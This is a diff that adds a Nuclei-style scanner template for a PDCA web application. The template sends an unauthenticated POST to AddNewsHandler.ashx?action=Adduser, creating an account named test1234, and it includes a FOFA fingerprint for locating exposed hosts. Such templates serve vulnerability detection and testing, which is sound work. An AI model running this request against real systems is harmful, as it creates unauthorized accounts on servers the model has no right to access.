@@ -1,0 +1,33 @@
+id: AddNewsHandler
+
+info:
+  name: AddNewsHandler
+  author: lengmo
+  severity: high
+  description: AddNewsHandler
+  tags: 
+  metadata:
+    fofa-qeury: "PDCA/js/_publicCom.js"
+    veified: true
+    max-request: 1
+
+http:
+  - raw:
+      - |
+        POST /PDCA/ashx/AddNewsHandler.ashx?action=Adduser HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+ 
+        username=test1234&pwd=test1234&savedays=1
+
+
+               
+    matchers:     
+      - type: dsl
+        dsl:
+          - "status_code == 200 && contains(header,'text/plain') && contains(body,'1')" 
